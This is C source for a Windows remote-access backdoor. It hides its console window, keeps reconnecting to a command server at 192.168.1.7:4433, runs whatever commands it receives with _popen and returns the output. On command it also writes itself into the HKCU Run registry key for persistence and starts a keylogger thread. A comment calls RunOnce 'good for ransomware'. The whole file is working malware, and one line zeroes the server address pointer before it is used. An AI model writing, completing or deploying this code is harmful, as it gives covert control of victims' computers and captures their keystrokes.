////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Library includes
#include <stdio.h> // for input and output stream
#include <unistd.h> // for interact with opreating system like filesystem , process , dirs
#include <stdlib.h> // involving memory allocation, process control , type conversion 

#include <winsock2.h> // windows socket
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>

#include <string.h> // string manipulation 

#include <sys/stat.h> // getting information about files attributes
#include <sys/types.h>

#include "keylogger.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////

// ******************************************************* //
// #define bzero(p ,size) (void) memset((p) , 0 , (size))  // 
// ******************************************************* //

int sock; // to make it global to use at any function

// diffrence between Run and RunOnce is the runonce run one time and the key will be deteled ;;;; good for ransomware
//HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
//HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

int bootRun(){
	// Two var to tell the server if persistence worked or not
	char err[128] = "Failed!\n";
	char suc[128] = "Created persistence at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \n";
	TCHAR szPath[MAX_PATH]; // declare a unicode var to support any language named szPath with length MAX_PATH which equal 256 chars
	DWORD pathLen = 0; //Double word 32bit ; support integer also
	
	pathLen = GetModuleFileName(NULL , szPath , MAX_PATH); // Fun to return the absluote path of current program path , if success will return the length of path , take 3 params NULL , var to stored the value which is path name , MAX_PATH;
	if (pathLen == 0){ // GetModuleFileName failed to get path
		send(sock , err , sizeof(err) , 0);// send to server that error;
		return -1; // return value to main function(bootRun)
	}

	HKEY NewVal ; // handle key with name NewVal to add value to reg
	if (RegOpenKey(HKEY_CURRENT_USER , TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run") , &NewVal) != ERROR_SUCCESS){
		send(sock , err , sizeof(err) , 0);
		return -1;
	}
	
	DWORD pathLenInByte = pathLen * sizeof(*szPath); 

	if (RegSetValueEx(NewVal , TEXT("REGnameTEST") , 0 , REG_SZ , (LPBYTE)szPath , pathLenInByte) != ERROR_SUCCESS ){
		RegCloseKey(NewVal);		
		send(sock , err , sizeof(err) , 0);
		return -1;
	}
	RegCloseKey(NewVal);		
	send(sock , suc , sizeof(suc) , 0);

	return 0;
}


/**
 * Extracts a selection of string and return a new string or NULL.
 * It supports both negative and positive indexes.
 */
char *
str_slice(char str[], int slice_from, int slice_to)
{
    // if a string is empty, returns nothing
    if (str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    // for negative indexes "slice_from" must be less "slice_to"
    if (slice_to < 0 && slice_from < slice_to) {
        str_len = strlen(str);

        // if "slice_to" goes beyond permissible limits
        if (abs(slice_to) > str_len - 1)
            return NULL;

        // if "slice_from" goes beyond permissible limits
        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    // for positive indexes "slice_from" must be more "slice_to"
    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        // if "slice_from" goes beyond permissible limits
        if (slice_from > str_len - 1)
            return NULL;

        buffer_len = slice_to - slice_from;
        str += slice_from;

    // otherwise, returns NULL
    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

// shell function to recv cmd from server and execute it on windows machine
void Shell(){

	char buffer[1024]; // to store the recvd command from server
	char container[1024]; //
	char total_response[18384]; // 

	while (1){
		jump:
		// overwrite these vars with zeroooooo
		memset(buffer , 0 , sizeof(buffer));
		memset(container , 0 , sizeof(container));
		memset(total_response , 0 , sizeof(total_response));

		recv(sock , buffer , sizeof(buffer) , 0); // takes 4 params 1:socket objetc ; 2:buffer var to store coming data; 3:size of coming data; 4: 0 means to more argument given;
		

		// check for incoming commands from the server side C2

		// takes 3 arg ; 1:value to be compared with ; 2:value to be compared ; 3:number of characters to be compared.
		// strncmp fun return values if 0 so its equal;
		if (strncmp("q" , buffer , 1) == 0){
			closesocket(sock); // close the socket connection
			WSACleanup(); // function to terminates use of the Winsock 2 
			exit(0); // exit the program
		}
		else if(strncmp("cd " , buffer , 3) == 0){
			chdir(str_slice(buffer , 3 , 100)); // using external function to move from dir to other 
		}
		else if (strncmp("persist" , buffer , 7) == 0){ // if the server side sends persist command it will call bootRun()
				bootRun(); // user built fun to make to program run auto we computer reboot
		}
		else if(strncmp("start_log" , buffer , 9) == 0){ // if server side send start_log , logg fun from keylogger header will work as a thread in the background , and goto jump to start recv command again.
			HANDLE thread = CreateThread(NULL , 0 , logg , NULL , 0 , NULL);
			goto jump;
		}	
		else{
			FILE *fp; // Create file descriptor to handle open process
			fp = _popen(buffer , "r"); // open process and execute the command from buffer var and from "r" read mode , read the response and store it in fp varl
			// check the size of response before send to the server;
			while (fgets(container , 1024 , fp) != NULL){ // fgets = get the response from fp and store it in container within just 1024 byte if return not equal NULL so there is more data , so get this data and put it in another var total_response , and while there is more data concatnate this data with total_response var , until the return value of fgets fun not NULL so its done
				strcat(total_response, container);	
			}
			send(sock , total_response , sizeof(total_response) , 0);
			fclose(fp);  // close the file descriptor 		
		}

	}
}

int main(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR pCmdLine, int nCmdShow){

	HWND stealth; // Handle window , object to manpulate with windows

	AllocConsole(); // To get console

	stealth = FindWindowA("ConsoleWindowClass",NULL); // object stealth getting return value from findwindowa function 

	ShowWindow(stealth , 0) ; // fun get stealth object and hide this window with 0
//------------------------------------------------------------------------------------------------------------------------------

	struct sockaddr_in ServAddr ; // define stuct like a class when taking object
	unsigned short ServPort; // int data 16bit , values between 0:65535 = number of ports
	char *ServIP ;
	WSADATA wsaData ; // struct contains informations about windows socket

	ServIP   = "192.168.1.7";
	ServPort = 4433;	

	if (WSAStartup(MAKEWORD(2,0),&wsaData) != 0){ // wsastartup ,  initiates use of the Winsock DLL by a process
		exit(1);   // if the return value of WSAStartuo not equal 0 so there is an error with init a socket
	}

	
	sock = socket(AF_INET , SOCK_STREAM , 0);

	// & mean give the address of var in memory
	memset(&ServIP , 0 , sizeof(ServIP)); // used to fill a block of memory with a particular value. > fill it with 000000

	ServAddr.sin_family = AF_INET ; // IPv4 
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //server address // inet_addr = function to convert string to IP format
	ServAddr.sin_port = htons(ServPort); // fun to takes unsigned short number to convert it to host network byte. 

	start: // if connect fun not return 0 repat the process
	while (connect(sock , (struct sockaddr *) &ServAddr , sizeof(ServAddr)) != 0){ // connect to server machine with assigned vlaues for ServAddr
		Sleep(10); // sleep for 10 sec then try to connect
		goto start; // jump statement , transfer program flow to some part
	}
//------------------------------------------------------------------------------------------------------------------------------


	Shell(); // call the shell function

	return 0;

}


//w1ndows
